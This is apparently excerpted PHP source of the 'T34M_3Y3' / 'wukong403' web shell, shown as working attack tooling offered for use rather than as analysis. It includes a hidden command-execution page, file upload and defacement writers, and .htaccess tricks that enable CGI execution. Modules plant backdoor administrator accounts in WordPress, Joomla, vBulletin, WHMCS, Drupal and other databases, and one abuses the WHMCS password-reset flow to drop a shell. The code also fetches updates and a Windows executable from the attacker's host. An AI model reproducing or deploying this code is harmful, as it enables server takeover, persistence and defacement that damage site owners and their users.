...
$GLOBALS['DB_NAME'] = $GLOBALS['T34M_3Y3'];
...
define("__wukong_CODE_NAME__", "T34M_3Y3");
...
$GLOBALS['__wukong_COLOR__'] = array(
    ...
    "disable_functions" => "#02e1ffff",
    "footer_text" => "#B501F7",
		"menu_options" => "#02e1ffff",
		...
		"hidden_shell_text" => array(
			"key_color" => "#7502FF","multi_selector" => array(
...
<title>.:T34M_3Y3 Tesla :.</title><center>
<center><img style="border-radius:100px;"width="500" height="500" alt="T34M_3Y3" draggable="false" src="https://amp.absolutitalia.com/godeye3.jpg" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>T34M_3Y3</b></font></th></tr>
...
function _wukong_cgicmd($cmd,$lang="",$set_cookie=false){
	...
	if(isset($_COOKIE["T34M_3YE_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["T34M_3YE"])){
			if(!@file_exists("T34M_3YE/".$_COOKIE["T34M_3YE"]."")){
				$recreate = true;
				$lang = $_COOKIE["T34M_3YE"];
			}
		}
		if(!isset($_COOKIE["T34M_3YE"])||$recreate){
			...
			wukongcgihtaccess('cgi', "T34M_3YE/");
		}else{
			$lang = $_COOKIE["T34M_3YE"];
		}
		$cgi_ext = ".T34M_3YE";
		...
		$out = "";
		if(strpos($data, "[wukong403~api]") !== false && strpos($data, '[wukong403~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__wukong_set_cookie("T34M_3YE", $lang);
			}
			...
			if($set_cookie){
				__wukong_set_cookie("T34M_3YE_mode", "off");
			}
		}
		return trim($out);
	}else{
...
if(isset($_GET["wukong403"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>T34M_3Y3 Hidden Shell</title>";
...
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_wukong403.value = btoa(unescape(encodeURIComponent(this.command_wukong403.value)));" method="POST">Execute Command: <input name="command_wukong403" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
<hr><pre>';
if(isset($_POST['command_wukong403'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
$wukong403 = "cd '".addslashes(str_replace("\\","/",@wukongGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_wukong403']);
echo wukongEx($wukong403);
}
echo'</pre>
</body></html>';
exit;}
...
$wukong_uploader = '$x = base64_decode("'.$GLOBALS['__wukong_SHELL_CODE'].'");$wukong = fopen("wukong.php","w");fwrite($wukong,$x);';
...
.ajaxarea{display:none;}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#7502FF;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole { background-image: url(https://amp.absolutitalia.com/godeye3.jpg); background-size: 100% 100%;background-attachment: fixed ; background-position: center; background-repeat: no-repeat }.header{height:auto;width:auto;border:5px solid #7502FF;color:' .
    wukong_getColor("header_values") .
...
.foottable{width: 300px;font-weight: bold;' .
    ...
    ".main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #7502FF;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.wukong_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}" .
    wukongCssLoadColors() .
    '
</style>';
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="160" alt="Wukong_Exploit" draggable="false" src="https://t4.ftcdn.net/jpg/05/90/89/33/240_F_590893393_4q8HbhLFMiVVUSPCg3pcfyoBe1xpDpDT.jpg" /></td>
</tr>
<tr>
...
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="wukong_exploit"><center><a href="https://t.me/wukong403" target="_blank"><span><font class="wukong-text" color="#eaf717">WE ARE GODS EYE</font></span></a></center></div></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzjACUUsOZeikylZdO2wrVmyEJ8vs7rBoV3Wh3pxc-7Q&s=10';
	$s['wukongmini']='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzjACUUsOZeikylZdO2wrVmyEJ8vs7rBoV3Wh3pxc-7Q&s=10';
	$s['loader']='https://amp.absolutitalia.com/loader.png';
...
$curl = new wukongCURL();
$content = $curl->Send("http://wukong403.com/market.php");
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['wukong3'])?$GLOBALS['DB_NAME']['user']:$_POST['wukong3']).'" placeholder="wukong"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['wukong5']=='>>'){
echo __pre();
...
echo '<div class="header">';
$news = new wukongCURL();
$about_us = $news->Send("http://wukong403.com/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='https://amp.absolutitalia.com/godeye3.jpg'><br>
<font color='#FFFFFF'>Shell ReCoded By WE ARE GODS EYE</font><br>
<font color='#00A220'>Contact : T34M_3Y3</font><br>
</center></pre><iframe src='tg://resolve?domain=wukong403' frameborder='0' width='0' height='0'></iframe>";
}
echo __pre().$about_us;
echo('</div>');
wukongfooter();
...
$create = "insert into tblclients (email) values('wukong@fbi.gov')";
...
$wukongSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=wukong@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$Wukong = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert("shell injectet...");
$ff= 'http://'.$path."/wukong.php";
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>wukong403@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/wukong403.php' target='_blank'>".$path."/wukong403.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
...
if($res){
$ff = 'http://'.$realurl.$realpath."/wukong403.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/wukong403.php";
...
function wukongcheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["T34M_3YE_mode"])&&!isset($_COOKIE["T34M_3YE"])){
	...
	if(function_exists("curl_version")){
		...
		$json = $update->Send("http://wukong403.com/update.json?ver=".__wukong_VERSION__);
		...
		if($json){
			...
			if(isset($json["wukong403"]) && !empty($json["wukong403"])){
				$data["wukong403"] = $json["wukong403"];
			}
...
function wukongupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = wukongEx("cd '{$tmp_path}/T34M_3YE';sh getheader.T34M_3Y3",false,true,true);
...
$hash = $_POST['wukong2'];
if(!empty($hash)){
$hash_type = $_POST['wukong403'];
$email = "wukong403@gmail.com";
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='wukongOpenPhpTerminal();return false;' class='foottable wukong_custom_cmd_btn'><img style='width:30px;vertical-align: middle;' src='https://www.reshot.com/preview-assets/icons/SF6M3N8D49/hacker-SF6M3N8D49.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='wukong-copyright'><span class='copyright'>[ T34M_3Y3 &copy;-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY T34M_3Y3WORLD\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>T34M_3Y3</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/wukong403'>@wukong403</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_wukong_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["wukongchdir_bash"])||@!file_exists($tmp_getdir_path."/T34M_3YE/getdir.wukong")){
		...
		$dirContent = wukongEx("cd ".$tmp_getdir_path."/T34M_3YE;sh getdir.wukong '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By T34M_3Y3World</title><b>Hacked By T34M_3Y3World</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['wukong6'])){
$s0levisible="Powered By T34M_3Y3";
$dbu = $_POST['wukong6'];
$path = $_POST['wukong5'];
$fname = $_POST['wukong4'];
$dbn = $_POST['wukong7'];
...
$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $wukong403 = fopen("'.$fname.'","w"); fwrite($wukong403,$x);';
...
$result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
$create = "insert into tblclients (email) values('wukong403@fbi.gov')";
$result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version')){
$wukongSole = new wukongCURL(true);
$saveurl = $wukongSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$wukongSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=wukong403@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$Wukong403 = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
...
<title>Hacked By T34M_3Y3World</title><b>Hacked By T34M_3Y3World</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['wukong6'])){
...
echo __pre();
$wukong4039 = _wukong_file('/etc/named.conf');
if(is_array($wukong4039)){
foreach($wukong4039 as $wukong40313){
if(@eregi('zone',$wukong40313)){
preg_match_all('#zone "(.*)"#',$wukong40313,$wukong40314);
if(strlen(trim($wukong40314[1][0])) > 2){
echo $wukong40314[1][0].'<br>';
}}}
}
}else{
echo __pre();
...
$s = $wukong->Send('http://wukong403.com/bc/windows.exe');
$tmpdir = wukong_TEMPDIR;
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'wukong403', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'wukong403@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$wukong403=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
$sole = @mysqli_num_rows($wukong403);
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($wukong403);
$res = $solevis['ID'];
}
$wukong403=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','wukong403'),(null,'".$res."','last_name','wukong403'),(null,'".$res."','nickname','wukong403'),(null,'".$res."','description','wukong403'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($wukong403){
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'wukong403', 'inputSize' => '50', 'disabled' => true),
 'td8'=>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'wukong403@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$prefix = $_POST['wukong10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
$sole =@mysqli_num_rows($wukong403);
if ($sole == 1){
$solevis =@mysqli_fetch_assoc($wukong403);
$res = $solevis['id'];
}
$wukong403=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
if($wukong403){
__alert('Success... '.$admin.' is created...');}
}
}
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'wukong403', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'wukong403@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$adm_perm = "16744444";
if($pw_col > 0){
$wukong403=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$wukong403=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$wukong403=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($wukong403);
if($sole == 1){
$solevis = mysqli_fetch_assoc($wukong403);
$res = $solevis['userid'];
}
$wukong403=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($wukong403){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5('wukong403');
$wukong403=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
if($wukong403){
__alert('Success... '.$admin.' is created...');
}
}
...
$SQL = $_POST['wukong9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
if($wukong403){
__alert('Success... '.$admin.' is created...');}
}
}
...
$prefix = $_POST['wukong10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
if($wukong403){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$wukong403=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
if($wukong403){
__alert('Success... '.$admin.' is created...');}
}
}
...
$wukong403=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','wukong403@fbi.gov','filtered_html','1','Europe/Berlin','wukong403@fbi.gov')") or die(mysqli_error($conn));
$wukong403=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($wukong403);
if ($sole == 1){
$solevis = mysqli_fetch_assoc($wukong403);
$res = $solevis['uid'];
}
$wukong403=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
if($wukong403){
__alert('Success... '.$admin.' is created...');}
}
}
...
$admin = $_POST['wukong8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'wukong403');
$wukong403=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','wukong403@fbi.gov')") or die(mysqli_error($conn));
if($wukong403){
__alert('Success... '.$admin.' is created...');}
}
}
...
if(isset($_POST['wukong2'])&&($_POST['wukong2']=='symperl'||$_POST["wukong2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo wukongiFrameCreator('cgiT34M_3Y3/'.$cginame);
	}else{
		echo $resource;
	}
}
...
if($sole){
	foreach($sole as $visible){
		if(@strstr($visible,":")){
			$wukong403 = explode(':', $visible);
			$cwd = str_replace("{user}", trim($wukong403[1]), $makepwd);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($wukong403[1]), trim($wukong403[0]), $cwd), $template);
		}
	}
}else{
...
break;
case 'pgsql':
$this->query("CREATE TABLE wukong403(file text);COPY wukong403 FROM '".addslashes($str)."';select file from wukong403;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table wukong403');
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://amp.absolutitalia.com/godeye3.jpg\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__wukong_DATA_FOLDER__.'/cgiT34M_3Y3/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
wukongfooter();
...
if($m=='cgi'){
$code = "#ReCoded By T34M_3Y3World\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .T34M_3Y3\nAddHandler cgi-script .T34M_3Y3";
}elseif($m=='sym'){
$code = "#ReCoded By T34M_3Y3World\nOptions Indexes FollowSymLinks\nDirectoryIndex wukong403.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
}elseif($m=='shtml'){
...
$tmp_path = wukongWriteTocgiapi("basedir.T34M_3Y3",$bash);
$bash_users  = wukongEx("cd ".$tmp_path."/T34M_3YE;sh basedir.T34M_3Y3 ".$makepwd,false,true,true);
